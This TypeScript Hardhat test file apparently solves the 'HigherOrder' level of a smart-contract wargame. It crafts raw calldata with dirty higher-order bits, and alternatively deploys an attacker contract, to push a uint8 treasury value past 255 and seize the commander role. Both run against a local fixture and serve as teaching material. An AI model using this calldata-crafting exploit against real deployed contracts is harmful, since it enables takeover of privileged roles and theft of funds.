import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import { TransactionRequest } from "ethers";
import hre from "hardhat";

import { HigherOrder, HigherOrderFactory, HigherOrderFactory__factory, HigherOrder__factory } from "../typechain-types";
import { MyHigherOrderAttack, MyHigherOrderAttack__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("30. HigherOrder", function () {
  let context: FixtureContext;
  let level: FixtureLevel<HigherOrderFactory, HigherOrder>;
  const HEXVAL = "0x0100";
  const UINT8_MAX = 255;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, HigherOrderFactory__factory, (address, signer) =>
      HigherOrder__factory.connect(address, signer),
    );
  });

  /*
  https://docs.soliditylang.org/en/latest/security-considerations.html#minor-details
  > Types that do not occupy the full 32 bytes might contain “dirty higher order bits”.
  > This is especially important if you access msg.data - it poses a malleability risk:
  > You can craft transactions that call a function f(uint8 x) with a raw byte argument of 0xff000001 and with 0x00000001.
  > Both are fed to the contract and both will look like the number 1 as far as x is concerned,
  > but msg.data will be different, so if you use keccak256(msg.data) for anything, you will get different results.

  https://github.com/ethereum/solidity/issues/14766 (closed)
  > This no longer seems to be true in Solidity >= 0.8. ABI decoding now reverts when it encounters dirty high-order bits.
  > Can you please confirm this is no longer an issue and add a comment to the documentation (or remove this section),
  > or clarify why this is still an issue in Solidity >= 0.8?
  */

  it("should be attacked successfully through custom transaction", async function () {
    expect(await level.instance.treasury()).to.be.lessThanOrEqual(UINT8_MAX);
    expect(await level.instance.commander()).to.be.not.equal(context.player);

    const payload = level.instance.registerTreasury.fragment.selector + hre.ethers.zeroPadValue(HEXVAL, 32).slice(2);

    const txreq: TransactionRequest = {
      to: await level.instance.getAddress(),
      from: context.player.address,
      data: payload,
    };

    const tx = await context.player.sendTransaction(txreq);
    await expect(tx).to.be.not.reverted;
    await tx.wait();

    const tx2 = await level.instance.claimLeadership();
    await expect(tx2).to.be.not.reverted;
    await tx2.wait();

    expect(await level.instance.treasury()).to.be.eq(BigInt(HEXVAL));
    expect(await level.instance.commander()).to.be.eq(context.player);

    await completeLevel(context, level);
  });

  it("should be attacked successfully through attacker contract", async function () {
    expect(await level.instance.treasury()).to.be.lessThanOrEqual(UINT8_MAX);
    expect(await level.instance.commander()).to.be.not.equal(context.player);

    // deploy attacker contract
    const attackFactory: MyHigherOrderAttack__factory = new MyHigherOrderAttack__factory(context.player);
    const attackContract: MyHigherOrderAttack = await attackFactory.deploy(level.instance);
    await attackContract.waitForDeployment();

    expect(await level.instance.treasury()).to.be.eq(BigInt(HEXVAL));

    const tx2 = await level.instance.claimLeadership();
    await expect(tx2).to.be.not.reverted;
    await tx2.wait();

    expect(await level.instance.commander()).to.be.eq(context.player);

    await completeLevel(context, level);
  });
});
